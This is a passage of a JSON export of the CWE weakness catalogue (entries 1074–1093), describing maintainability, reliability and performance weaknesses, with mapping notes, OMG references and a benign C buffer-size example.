        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1074",
      "Name": "Class with Excessively Deep Inheritance",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A class has an inheritance level that is too high, i.e., it\n\t\t\t\t\thas a large number of parent classes.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of parent classes\" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1093",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-17"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-17",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1075",
      "Name": "Unconditional Control Flow Transfer outside of Switch Block",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs unconditional control transfer (such as a\n\t\t\t\t\t\"goto\") in code outside of a branching structure such as a switch\n\t\t\t\t\tblock.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-1"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-1",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1076",
      "Name": "Insufficient Adherence to Expected Conventions",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product's architecture, source code, design, documentation,\n\t\t\t\t\tor other artifact does not follow required conventions.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1077",
      "Name": "Floating Point Comparison with Incorrect Operator",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code performs a comparison such as an\n        equality test between two float (floating point) values, but\n        it uses comparison operators that do not account for the\n        possibility of loss of precision.",
      "ExtendedDescription": "\n\nNumeric calculation using floating point values can generate imprecise results because of rounding errors. As a result, two different calculations might generate numbers that are mathematically equal, but have slightly different bit representations that do not translate to the same mathematically-equal values. As a result, an equality test or other comparison might produce unexpected results.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-9"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-9",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-975",
          "Authors": [
            "Bruce Dawson"
          ],
          "Title": "Comparing Floating Point Numbers, 2012 Edition",
          "PublicationYear": "2012",
          "PublicationMonth": "02",
          "PublicationDay": "25",
          "URL": "https://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1078",
      "Name": "Inappropriate Source Code Style or Formatting",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The source code does not follow\n\t\t\t\tdesired style or formatting for indentation, white\n\t\t\t\tspace, comments, etc.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-215",
          "Entries": [
            {
              "IntroText": "The usage of symbolic names instead of hard-coded constants is preferred."
            },
            {
              "BodyText": "The following is an example of using a hard-coded constant instead of a symbolic name."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar buffer[1024];\n\t...\n\tfgets(buffer, 1024, stdin);\n```"
            },
            {
              "BodyText": "If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tenum { MAX_BUFFER_SIZE = 1024 };\n\t...\n\tchar buffer[MAX_BUFFER_SIZE];\n\t...\n\tfgets(buffer, MAX_BUFFER_SIZE, stdin);\n```"
            },
            {
              "BodyText": "In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1079",
      "Name": "Parent Class without Virtual Destructor Method",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably due to undefined or unexpected behaviors. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-16"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-16",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1080",
      "Name": "Source Code File with Excessive Number of Lines of Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A source code file has too many lines of\n\t\t\t\t\tcode.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"too many lines of code\" may vary for each product or developer, CISQ recommends a default threshold value of 1000.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-8"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-8",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1082",
      "Name": "Class Instance Self Destruction Control Element",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code contains a class instance that calls the method or function to delete or destroy itself.",
      "ExtendedDescription": "\n\nFor example, in C++, \"delete this\" will cause the object to delete itself.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-7"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-7",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-976",
          "Authors": [
            "Standard C++ Foundation"
          ],
          "Title": "Memory Management",
          "URL": "https://isocpp.org/wiki/faq/freestore-mgmt#delete-this"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1083",
      "Name": "Data Access from Outside Expected Data Manager Component",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.",
      "ExtendedDescription": "\n\nWhen the product has a data access component, the design may be intended to handle all data access operations through that component. If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-10"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-10",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1084",
      "Name": "Invokable Control Element with Excessive File or Data Access Operations",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A function or method contains too many\n\t\t\t\t\toperations that utilize a data manager or file resource.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"too many operations\" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-14"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-14",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1085",
      "Name": "Invokable Control Element with Excessive Volume of Commented-out Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A function, method, procedure, etc. contains an excessive amount of code that has been\n\t\t\t\t\tcommented out within its body.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"excessive volume\" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1078",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-6"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-6",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1086",
      "Name": "Class with Excessive Number of Child Classes",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A class contains an unnecessarily large number of\n\t\t\t\t\tchildren.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of children\" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1093",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-18"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-18",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1087",
      "Name": "Class with Virtual Method without a Virtual Destructor",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A class contains a virtual method, but the method does not have an associated virtual destructor.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. due to undefined behavior. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-15"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-15",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1088",
      "Name": "Synchronous Access of Remote Resource without Timeout",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, since an outage for the remote resource can cause the product to hang. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "821",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-19"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-19",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1089",
      "Name": "Large Data Table with Excessive Number of Indices",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a large data table that contains an excessively large number of\n\t\t\t\t\tindices.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"excessively large number of indices\" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a \"large\" table and a default threshold of 3 indices.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-6"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-6",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1090",
      "Name": "Method Containing Access of a Member Element from Another Class",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A method for a class performs an operation that directly\n\t\t\t\t\taccesses a member element from another class.",
      "ExtendedDescription": "\n\nThis issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-16"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-16",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1091",
      "Name": "Use of Object without Invoking Destructor Method",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a method that accesses an object but does not later invoke\n\t\t\t\t\tthe element's associated finalize/destructor method.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly by retaining memory and/or other resources longer than necessary. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "772",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-15"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-15",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1092",
      "Name": "Use of Same Invokable Control Element in Multiple Architectural Layers",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses the same control element across multiple\n\t\t\t\t\tarchitectural layers.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-10"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-10",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1093",
      "Name": "Excessively Complex Data Representation",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
